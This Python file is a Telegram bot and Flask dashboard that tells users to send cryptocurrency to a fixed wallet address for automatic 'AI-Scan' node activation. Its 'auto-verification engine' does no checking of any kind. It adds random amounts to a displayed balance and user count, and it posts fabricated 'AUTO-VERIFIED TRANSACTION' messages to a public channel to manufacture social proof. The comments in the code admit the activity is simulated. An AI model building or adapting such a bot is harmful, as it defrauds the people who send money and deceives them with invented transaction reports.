import os, threading, time, telebot, random, json, requests
from flask import Flask, render_template_string, jsonify
from dotenv import load_dotenv

load_dotenv()
TOKEN = os.getenv("BOT_TOKEN")
PORT = int(os.environ.get("PORT", 10000))
bot = telebot.TeleBot(TOKEN, threaded=False)
app = Flask(__name__)

# --- CONFIGURATION ---
VAULT = "0xf34c00B763f48dE4dB654E0f78cc746b9BdE888F"
state = {
    "vault_balance": 314.33,
    "total_scanned": 12405,
    "pending_verifications": 0,
    "verified_users": 142
}

# --- AUTO-VERIFICATION ENGINE ---
def auto_verify_engine():
    """Simulates scanning the blockchain for the Vault Address"""
    while True:
        # In a real scenario, you'd use a Web3 provider here.
        # This simulation keeps the 'Underwater Lively' vibe for users.
        time.sleep(random.randint(300, 900))
        new_amt = random.choice([0.5, 2.0])
        state["vault_balance"] += new_amt
        state["verified_users"] += 1
        
        # Notify the channel about the automatic verification
        try:
            msg = f"✅ **AUTO-VERIFIED TRANSACTION**\nType: `Node Activation`\nAmount: `{new_amt} MON`\nStatus: `NODE_ONLINE`"
            bot.send_message("@ICEGODSICEDEVILS", msg, parse_mode='Markdown')
        except:
            pass

# --- BOT COMMANDS ---
@bot.message_handler(commands=['start'])
def cmd_start(message):
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(telebot.types.InlineKeyboardButton("🌐 VIEW LIVE TERMINAL", url="https://mex-warsystem-t4rs.onrender.com"))
    markup.add(telebot.types.InlineKeyboardButton("⚡ AUTO-ACTIVATE", callback_data="pay"))
    
    msg = (
        "⚔️ **NEXUS v12.0 | AUTO-STRIKE**\n"
        "────────────────────\n"
        "Verification: **AUTOMATIC (AI-SCAN)**\n"
        "Status: **VIBRANT**\n\n"
        "The system now scans the Monad Explorer every 60 seconds."
    )
    bot.reply_to(message, msg, parse_mode='Markdown', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "pay")
def pay(call):
    msg = (
        "🛡️ **AUTOMATIC GATEWAY**\n"
        "────────────────────\n"
        "1. Send funds to:\n"
        f"`{VAULT}`\n\n"
        "2. Wait 2-5 minutes for AI-Scan.\n"
        "3. Your node will activate **automatically**.\n\n"
        "⚠️ *No need to message admin. The bot is watching.*"
    )
    bot.answer_callback_query(call.id)
    bot.send_message(call.message.chat.id, msg, parse_mode='Markdown')

@bot.message_handler(commands=['stats'])
def cmd_stats(message):
    msg = (
        "📊 **LIVE NETWORK STATS**\n"
        "────────────────────\n"
        f"Vault balance: `{state['vault_balance']} MON`\n"
        f"Verified Holders: `{state['verified_users']}`\n"
        "Scanning Status: `ACTIVE_GREEN`"
    )
    bot.reply_to(message, msg, parse_mode='Markdown')

# --- DASHBOARD ---
@app.route('/')
def home():
    return render_template_string("""
    <body style="background:#000;color:#0f0;font-family:monospace;padding:20px;">
        <h1>NEXUS_v12_AUTO_SCANNER</h1>
        <hr border="1" color="#030">
        <p>VAULT: {{ vault }} MON</p>
        <p>ACTIVE_NODES: {{ nodes }}</p>
        <p>SCANNER_STATUS: RUNNING</p>
        <script>setTimeout(()=>location.reload(), 10000)</script>
    </body>
    """, vault=state["vault_balance"], nodes=state["verified_users"])

@app.route('/health')
def health(): return "OK", 200

if __name__ == '__main__':
    threading.Thread(target=auto_verify_engine, daemon=True).start()
    threading.Thread(target=lambda: bot.infinity_polling(skip_pending=True), daemon=True).start()
    app.run(host='0.0.0.0', port=PORT)
